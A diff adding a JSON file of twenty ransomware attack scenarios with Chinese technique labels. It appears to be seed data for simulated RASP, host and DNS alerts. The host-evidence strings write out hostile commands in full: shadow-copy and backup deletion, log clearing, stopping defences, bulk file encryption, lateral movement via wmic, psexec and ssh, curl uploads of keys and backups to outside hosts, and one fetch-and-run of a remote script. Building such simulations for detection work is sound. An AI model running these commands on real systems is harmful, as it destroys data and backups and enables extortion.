@@ -1,0 +1,496 @@
+{
+ "form": "FA",
+ "scenarios": [
+  {
+   "idx": 1,
+   "technique": "文件上传落地 WebShell 后删除卷影并批量加密共享目录",
+   "stack": "php",
+   "host_num": 12,
+   "shape": [
+    "rasp",
+    "hids",
+    "hids"
+   ],
+   "path": "/wp-admin/admin-ajax.php?action=upload",
+   "carrier": "form-data; name=\"file\"; filename=\"upd.php\"",
+   "rasp_evidence": "{\"upload\": \"upd.php\", \"cmd\": \"vssadmin delete shadows /all /quiet\"}",
+   "hids": [
+    "cipher /e /s:C:\\inetpub\\data cipher.exe cipher.exe /e /s:C:\\inetpub\\data <== php-cgi.exe",
+    "vssadmin delete shadows /all /quiet cmd.exe cmd.exe /c vssadmin delete shadows /all /quiet <== php-cgi.exe"
+   ],
+   "ua": "windows-chrome",
+   "deltas": [
+    0,
+    88,
+    260
+   ]
+  },
+  {
+   "idx": 2,
+   "technique": "凭据复用横向登录文件服务器后关闭恢复环境并加密数据盘",
+   "stack": "go",
+   "host_num": 44,
+   "shape": [
+    "hids",
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "net use \\\\10.20.3.61\\files$ && bcdedit /set recoveryenabled no cmd.exe cmd.exe /c net use <== cmd.exe /c net <== services.exe",
+    "cipher /e /s:C:\\files\\2026q2 cipher.exe cipher.exe /e /s:C:\\files\\2026q2 <== cmd.exe /c cipher.exe"
+   ],
+   "ua": "windows-firefox",
+   "deltas": [
+    0,
+    165
+   ]
+  },
+  {
+   "idx": 3,
+   "technique": "RDP 弱口令爆破成功后删除备份编录并外传加密密钥",
+   "stack": "node",
+   "host_num": 5,
+   "shape": [
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "mstsc /v:10.20.3.61 && wbadmin delete catalog -quiet && cipher /e /s:C:\\db && curl -T C:\\db\\.k 10.20.5.19 cmd.exe cmd.exe /c wbadmin delete catalog -quiet <== services.exe"
+   ],
+   "ua": "windows11-edge",
+   "deltas": [
+    0,
+    0,
+    40,
+    120
+   ],
+   "dns_base": "tafmez-4b19.net",
+   "dns_gap_h": 2.6,
+   "dns_steps": [
+    40,
+    120
+   ]
+  },
+  {
+   "idx": 4,
+   "technique": "注册每日计划任务投放加密脚本并删除 C 盘卷影副本",
+   "stack": "django",
+   "host_num": 63,
+   "shape": [
+    "hids",
+    "hids",
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "schtasks /create /tn OpsSync /tr \"cmd.exe /c C:\\ProgramData\\ops.bat\" /sc daily /ru SYSTEM <== cmd.exe /c schtasks",
+    "vssadmin delete shadows /all /quiet /for=C: cmd.exe cmd.exe /c vssadmin delete shadows /for=C: <== cmd.exe /c vssadmin",
+    "openssl enc -aes-256-cbc -pbkdf2 -salt -in C:\\share\\2026Q2.xlsx -out C:\\share\\2026Q2.xlsx.lock <== cmd.exe /c openssl"
+   ],
+   "ua": "linux-x11-chrome",
+   "deltas": [
+    0,
+    40,
+    420
+   ]
+  },
+  {
+   "idx": 5,
+   "technique": "PowerShell 载入器清理安全日志并删除卷影后循环加密文档",
+   "stack": "rails",
+   "host_num": 29,
+   "shape": [
+    "hids",
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "wevtutil cl System && wbadmin delete catalog -quiet cmd.exe cmd.exe /c wevtutil cl System <== services.exe <== wininit.exe",
+    "powershell -c \"$a=[Security.Cryptography.Aes]::Create();gci C:\\docs -r|%{$e=$a.CreateEncryptor();[IO.File]::WriteAllBytes($_.FullName+'.locked',$e.TransformFinalBlock([IO.File]::ReadAllBytes($_.FullName),0,$_.Length))}\""
+   ],
+   "ua": "android14-pixel",
+   "deltas": [
+    0,
+    130
+   ]
+  },
+  {
+   "idx": 6,
+   "technique": "停用 SQL Server 业务服务后删除卷影并加密 MDF 数据文件",
+   "stack": "java",
+   "host_num": 199,
+   "shape": [
+    "hids",
+    "hids",
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "net stop MSSQLSERVER && net stop SQLSERVERAGENT cmd.exe cmd.exe /c net stop MSSQLSERVER <== cmd.exe /c net <== services.exe",
+    "vssadmin delete shadows /all /quiet && vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB <== cmd.exe /c vssadmin",
+    "openssl enc -aes-256-cbc -in C:\\SQL\\DATA\\orders.mdf -out C:\\SQL\\DATA\\orders.mdf.lock <== cmd.exe /c openssl <== services.exe"
+   ],
+   "ua": "windows11-edge",
+   "deltas": [
+    0,
+    25,
+    95
+   ]
+  },
+  {
+   "idx": 7,
+   "technique": "挂载共享盘并删除编录后用 gpg 递归批量加密 Office 文档",
+   "stack": "nginx",
+   "host_num": 17,
+   "shape": [
+    "hids",
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "net use Z: \\\\10.20.4.88\\share && wbadmin delete catalog -quiet cmd.exe cmd.exe /c net <== cmd.exe /c net <== services.exe",
+    "for /r Z:\\ %i in (*.docx *.xlsx) do gpg -c --batch --passphrase-file /tmp/.k --yes %i cmd.exe cmd.exe /c for /r Z:"
+   ],
+   "ua": "windows-firefox",
+   "deltas": [
+    0,
+    145
+   ]
+  },
+  {
+   "idx": 8,
+   "technique": "批量打包加密业务目录并投放 README_RESTORE.txt 说明文件",
+   "stack": "node",
+   "host_num": 33,
+   "shape": [
+    "rasp",
+    "hids"
+   ],
+   "path": "/api/v1/files/bulk",
+   "carrier": "action=encrypt&note=README_RESTORE.txt&dir=/srv/share",
+   "rasp_evidence": "{\"upload\": \"README_RESTORE.txt\", \"cmd\": \"gpg -c -o /srv.tgz.gpg\"}",
+   "hids": [
+    "rm -rf /backup/* && tar czf - /srv/share | gpg -c -o /srv/share.tgz.gpg tar tar czf - /srv <== /bin/bash -c 'rm'"
+   ],
+   "ua": "mac-safari",
+   "deltas": [
+    0,
+    118
+   ]
+  },
+  {
+   "idx": 9,
+   "technique": "停用实时防护进程后删除卷影并用 cipher 批量加密运维目录",
+   "stack": "spring",
+   "host_num": 51,
+   "shape": [
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "net stop WinDefend && vssadmin delete shadows /all /quiet && gpg -c --batch --passphrase-file C:\\k.dat --yes C:\\Ops\\* cmd.exe cmd.exe /c net stop WinDefend <== services.exe"
+   ],
+   "ua": "ios-iphone",
+   "deltas": [
+    0
+   ]
+  },
+  {
+   "idx": 10,
+   "technique": "通过 wmic 远程节点分发加密器并清除目标主机编录",
+   "stack": "tomcat",
+   "host_num": 96,
+   "shape": [
+    "hids",
+    "hids",
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "wmic /node:10.20.8.14 process call create \"cmd.exe /c copy \\\\10.20.3.9\\pub\\l.exe C:\\p.exe\" <== cmd.exe /c wmic",
+    "wmic /node:10.20.8.14 process call create \"cmd.exe /c C:\\p.exe -s C:\\share\" <== cmd.exe /c wmic <== services.exe",
+    "cipher /e /s:C:\\share && wbadmin delete catalog -quiet cipher.exe cipher.exe /e /s:C:\\share <== cmd.exe /c cipher"
+   ],
+   "ua": "windows-chrome",
+   "deltas": [
+    0,
+    85,
+    215
+   ]
+  },
+  {
+   "idx": 11,
+   "technique": "加密完成后删除本地归档备份并 shred 加密脚本与密钥自毁",
+   "stack": "go",
+   "host_num": 140,
+   "shape": [
+    "hids",
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "openssl enc -aes-256-cbc -pass file:/tmp/.k -in /srv/db/orders.sql -out /srv/db/orders.sql.enc <== /bin/bash -c 'openssl'",
+    "rm -rf /var/backups/* && shred -u /tmp/.enc.sh shred shred -u /tmp/.enc.sh <== /bin/bash"
+   ],
+   "ua": "linux-x11-chrome",
+   "deltas": [
+    0,
+    260
+   ]
+  },
+  {
+   "idx": 12,
+   "technique": "入侵备份服务器删除备份目录与 LVM 快照并外传文件清单",
+   "stack": "rails",
+   "host_num": 60,
+   "shape": [
+    "hids",
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "ssh -i /tmp/.key -o StrictHostKeyChecking=no root@10.20.10.31 \"rm -rf /backup/*\" <== /bin/bash -c 'ssh' <== /usr/sbin/cron",
+    "tar czf - /srv/backup | gpg -c -o /tmp/b.tgz.gpg && lvremove -f /dev/vg0/bk_snap <== /bin/bash -c 'tar' <== /usr/sbin/cron"
+   ],
+   "ua": "mac-safari",
+   "deltas": [
+    0,
+    70,
+    0,
+    60,
+    90
+   ],
+   "dns_base": "qovzmi-9c31.net",
+   "dns_gap_h": 3.2,
+   "dns_steps": [
+    60,
+    90
+   ]
+  },
+  {
+   "idx": 13,
+   "technique": "停用 mysqld 后删除归档备份并加密 InnoDB 表空间文件",
+   "stack": "java",
+   "host_num": 104,
+   "shape": [
+    "hids",
+    "hids",
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "systemctl stop mysqld && rm -rf /var/backups/mysql mysqld mysqld systemctl stop mysqld <== /bin/bash -c 'systemctl'",
+    "find /var/lib/mysql -name \"ib*.ibd\" -exec openssl enc -aes-256-cbc -in {} -out {}.enc \\; <== /bin/bash -c 'find'",
+    "printf \"data renamed to .enc\" > /srv/README_RESTORE.txt && rm -f /tmp/.k <== /bin/bash -c 'printf' <== /usr/sbin/cron"
+   ],
+   "ua": "android14-pixel",
+   "deltas": [
+    0,
+    120,
+    240
+   ]
+  },
+  {
+   "idx": 14,
+   "technique": "删除虚拟机快照后加密 vmdk 镜像文件并清除镜像备份",
+   "stack": "tomcat",
+   "host_num": 22,
+   "shape": [
+    "hids",
+    "hids",
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "virsh snapshot-delete web01 base --metadata virsh virsh snapshot-delete web01 base <== /bin/bash -c 'virsh' <== /usr/sbin/cron",
+    "find /vmstore -name \"*.vmdk\" -exec gpg -c --batch --passphrase-file /tmp/.k {} \\; find find /vmstore -name <== /bin/bash -c 'find'",
+    "rm -rf /vmstore/snapshots/* && unlink /vmstore/base.vmdk.bak <== /bin/bash -c 'rm' <== /usr/sbin/cron <== /usr/bin/python3"
+   ],
+   "ua": "windows11-edge",
+   "deltas": [
+    0,
+    180,
+    300
+   ]
+  },
+  {
+   "idx": 15,
+   "technique": "删除卷影副本、全盘加密并投放 !RECOVER!.txt 说明文件",
+   "stack": "node",
+   "host_num": 77,
+   "shape": [
+    "hids",
+    "hids",
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "vssadmin delete shadows /all /quiet && wbadmin delete catalog -quiet cmd.exe cmd.exe /c vssadmin <== cmd.exe /c vssadmin",
+    "powershell -c \"gci C:\\share -r|%{cipher /e $_.FullName}\" && echo note>C:\\share\\!RECOVER!.txt powershell.exe powershell.exe -c",
+    "wevtutil cl Application && wevtutil cl System cmd.exe cmd.exe /c wevtutil cl <== cmd.exe /c wevtutil <== services.exe"
+   ],
+   "ua": "windows-android13",
+   "deltas": [
+    0,
+    55,
+    200
+   ]
+  },
+  {
+   "idx": 16,
+   "technique": "配置安全模式启动后删除备份编录并加密数据分区",
+   "stack": "spring",
+   "host_num": 138,
+   "shape": [
+    "hids",
+    "hids",
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "bcdedit /set {default} safeboot network cmd.exe cmd.exe /c bcdedit /set {default} safeboot <== cmd.exe /c bcdedit",
+    "wbadmin delete catalog -quiet && wbadmin delete systemstatebackup -deleteOldest <== cmd.exe /c wbadmin <== services.exe",
+    "gpg -c --batch --passphrase-file D:\\k.dat --yes D:\\Data\\* && wevtutil cl Application cmd.exe cmd.exe /c cipher /e /s:D:"
+   ],
+   "ua": "windows-firefox",
+   "deltas": [
+    0,
+    480,
+    90
+   ]
+  },
+  {
+   "idx": 17,
+   "technique": "PsExec 远程会话投放并运行加密器清空共享目录",
+   "stack": "tomcat",
+   "host_num": 61,
+   "shape": [
+    "hids",
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "psexec \\\\10.20.6.77 -s -d cmd.exe /c copy \\\\10.20.3.9\\pub\\openssl.exe C:\\openssl.exe <== cmd.exe /c psexec <== services.exe",
+    "psexec \\\\10.20.6.77 -s cmd.exe /c \"vssadmin delete shadows /all /quiet & openssl enc -aes-256-cbc -pass file:C:\\k -in C:\\share\\db.bak -out C:\\share\\db.bak.enc\" <== psexec.exe"
+   ],
+   "ua": "windows-chrome",
+   "deltas": [
+    0,
+    190
+   ]
+  },
+  {
+   "idx": 18,
+   "technique": "本地压缩加密后取走备份并删除原始数据目录形成双重破坏",
+   "stack": "go",
+   "host_num": 155,
+   "shape": [
+    "hids",
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "rm -rf /srv/data /var/backups/* && curl -T /tmp/bk.tgz.gpg http://203.0.113.44/u <== /bin/bash -c 'rm' <== /usr/sbin/cron",
+    "tar czf /tmp/bk.tgz /srv/data && gpg -c --batch --passphrase-file /tmp/.k /tmp/bk.tgz <== /bin/bash -c 'tar' <== /usr/sbin/cron"
+   ],
+   "ua": "linux-x11-chrome",
+   "deltas": [
+    0,
+    210,
+    0,
+    35,
+    75
+   ],
+   "dns_base": "vexrum-77ad.net",
+   "dns_gap_h": 1.8,
+   "dns_steps": [
+    35,
+    75
+   ]
+  },
+  {
+   "idx": 19,
+   "technique": "curl 下载加密脚本落地即执行并删除归档备份目录",
+   "stack": "nginx",
+   "host_num": 190,
+   "shape": [
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "curl -fsSL 203.0.113.44/upd.sh -o /tmp/.u.sh && rm -rf /backup/* && sh /tmp/.u.sh && openssl enc -aes-256-cbc -pass file:/tmp/.k -in /srv/db -out /srv/db.enc"
+   ],
+   "ua": "windows-android13",
+   "deltas": [
+    0
+   ]
+  },
+  {
+   "idx": 20,
+   "technique": "Web 接口触发横向扩散后加密多台主机并清理认证日志",
+   "stack": "spring",
+   "host_num": 142,
+   "shape": [
+    "rasp",
+    "hids",
+    "hids"
+   ],
+   "path": "/api/v2/tasks/run",
+   "carrier": "id=2048&script=deploy.sh&nodes=10.20.8.0/24",
+   "rasp_evidence": "{\"cmd\": \"bash deploy.sh --hosts 10.20.8.0/24\", \"template\": \"run\"}",
+   "hids": [
+    "for h in 10.20.8.11 10.20.8.12; do ssh root@$h \"rm -rf /backup/*\"; done ssh ssh for h in <== /bin/bash -c 'for'",
+    "openssl enc -aes-256-cbc -pass file:/tmp/.k -in /srv/vm -out /srv/vm.enc && shred -u /var/log/auth.log <== /bin/bash -c 'openssl'"
+   ],
+   "ua": "ios-iphone",
+   "deltas": [
+    0,
+    88,
+    340
+   ]
+  }
+ ]
+}
